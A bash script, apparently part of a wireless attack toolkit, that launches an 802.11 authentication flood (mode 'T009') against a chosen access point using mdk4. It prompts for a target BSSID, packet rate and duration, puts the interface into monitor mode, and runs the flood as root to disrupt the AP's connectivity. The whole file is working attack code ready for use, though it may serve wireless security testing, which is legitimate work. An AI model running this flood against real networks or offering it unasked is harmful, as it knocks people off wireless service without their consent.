#!/bin/bash
#
# Utility: Authentication Flood using mdk4
#
# Description:
#   Launches an authentication flood attack against a target access point using mdk4.
#   Sends rapid, spoofed 802.11 authentication frames to fill the AP's auth table and disrupt connectivity.
#
# Requirements:
#   - mdk4 must be installed and in PATH
#   - Must be run with sudo/root privileges (handled via watt.py)
#   - Interface must support monitor mode
#
# Usage:
#   ./run_mdk4_auth.sh
#
# Inputs:
#   - Defaults in config.sh
#    - Target BSSID
#    - Packet rate
#    - Duration in seconds
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Forms the basis for T009

# ─── Paths ───
BASH_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
CONFIG_DIR="$BASH_DIR/config"
HELPERS_DIR="$BASH_DIR/helpers"
UTILITIES_DIR="$BASH_DIR/utilities"
SERVICES_DIR="$BASH_DIR/services"

# ─── Configs ───
source "$CONFIG_DIR/global.conf"
ATK_DURATION=60
ATK_AUTH_PPS=150
ATK_BSSID="02:00:00:00:00:02"

# ─── Helpers ───
source "$HELPERS_DIR/fn_print.sh"
source "$HELPERS_DIR/fn_mode.sh"
source "$HELPERS_DIR/fn_cleanup.sh"

# Check mdk4
if ! command -v mdk4 &> /dev/null; then
    print_fail "mdk4 not found. Please install it first."
    exit 0
fi

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$ATK_AUTH_PPS" || -z "$ATK_BSSID" ]]; then
    print_warn "INTERFACE, ATK_AUTH_PPS, or ATK_BSSID not defined in atk_mdk4_auth.conf"
    exit 0
fi

# Display config
echo "Mode         : T009 - Authentication Flood"
echo "Interface    : $INTERFACE"
echo "Target BSSID : $ATK_BSSID"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input target BSSID
while true; do
    print_prompt "Target BSSID [default: ${ATK_BSSID}]: "
    read -r BSSID

    BSSID="${BSSID:-$ATK_BSSID}"
    
    if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
        break
    else
        print_fail "Invalid BSSID format. Expected XX:XX:XX:XX:XX:XX"
    fi
done

# Input packet rate
while true; do
    print_prompt "Transmit rate (pps) [default: ${ATK_AUTH_PPS}]: "
    read -r PACKET_RATE

    PACKET_RATE="${PACKET_RATE:-$ATK_AUTH_PPS}"

    if [[ "$PACKET_RATE" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T009" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Set monitor mode
ensure_monitor_mode

# Run attack
print_blank
print_info "Running T009 - Authentication Flood attack for $DURATION seconds"
sudo timeout "$DURATION" mdk4 "$INTERFACE" a -a "$BSSID" -s "$PACKET_RATE"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0